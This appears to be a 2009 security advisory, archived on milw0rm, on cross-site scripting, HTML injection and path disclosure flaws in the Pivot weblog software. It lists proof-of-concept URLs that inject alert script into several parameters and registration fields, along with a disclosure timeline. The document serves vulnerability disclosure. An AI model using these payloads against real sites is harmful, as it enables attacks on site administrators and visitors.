@@ -1,0 +1,83 @@
+Pivot - XSS and HTML Injection Vulnerabilities
+
+Versions Affected: 1.40.4 and 1.40.7 (22nd March 2009) (newest)
+
+Info: Pivot is a web-based tool to help you maintain dynamic sites, like
+weblogs or online journals. Pivot is released under the GPL so it is
+completely free to use. It is written in PHP, and does not require
+additional libraries or databases to function.
+
+Credits: InterN0T
+
+External Links:
+http://www.pivotlog.net/
+
+
+-:: The Advisory ::-
+
+Vulnerable Function / ID Calls:
+url, menu, sort, check[], edituser, edit, blog, cat.
+
+Path Disclosure:
+http://[HOST]/pivot/pivot/tb.php?tb_id=1&url='
+
+Cross Site Scripting: (can only be triggered when One is not logged in).
+http://[HOST]/pivot/pivot/index.php?menu="><script>alert(0)</script><br
+
+Cross Site Scripting: (triggers on logged in administrators only) [low
+or no impact due to session-key in url]
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=entries&sort="><script>alert(0)</script>
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=entries&doaction=1&action=delete&check[]='><script>alert(0)</script>
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=entries&doaction=1&action=delete&check['><script>alert(0)</script>]=0
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=admin&func=admin&do=edituser&edituser=</title><script>alert(0)</script>
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=admin&func=admin&do=templates&edit=<script>alert(0)</script>
+
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=admin&func=admin&do=blog_edit1&blog="><script>alert(0)</script>
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=admin&func=admin&do=cat_edit&cat="><script>alert(0)</script>
+
+Cross Site Scripting using Post Method: (triggers on logged in
+administrators only) [low impact - see above] << Filter Field.
+'><script>alert(0)</script> in
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=entries&doaction=1
+
+HTML Injection: (this will only affect the user logged in apparently..)
+http://[HOST]/pivot/pivot/user.php?func=edit_prefs&w=my_weblog
+sign up formular (all fields might be, but url is recommended to use)
+(use "> to escape tag)
+http://[HOST]/pivot/pivot/user.php?func=reg_user&w=my_weblog
+
+
+http://[HOST]/pivot/pivot/user.php?func=reg_user&w=my_weblog
+-- Set username to <script>alert(0)</script>
+--- It is possible to trigger it other places such as in the title or in
+the "hidden" input variable.
+---- Use "> to escape the hidden tag and </title> to escape the title tag.
+
+
+Affected Admin Site:
+http://[HOST]/pivot/pivot/index.php?session=VALIDSESSION&menu=admin&func=admin&do=editcommuser&edituser=VALIDUSERHASH
+
+
+-:: Solution ::-
+The solution for this is not simple at all. I suggest a complete review
+of the entire codebase.
+
+Conclusion:
+When we first checked the platform for vulnerabilities we had apparently
+installed an old version, so we updated to the newest version which
+apparently had some "XSS-bug fixed", strangely enough all the
+vulnerabilities we found are still there.
+
+Reference:
+http://forum.intern0t.net/intern0t-advisories/1119-intern0t-pivot-1-40-4-7-multiple-vulnerabilities.html
+
+Disclosure Information:
+- Vulnerabilities found, researched and confirmed between 5th to 10th June.
+- Advisory finished and published on InterN0T the 12th June.
+- Vendor and Buqtraq (SecurityFocus) contacted the 12th June.
+
+
+All of the best,
+MaXe
+
+# milw0rm.com [2009-06-12]
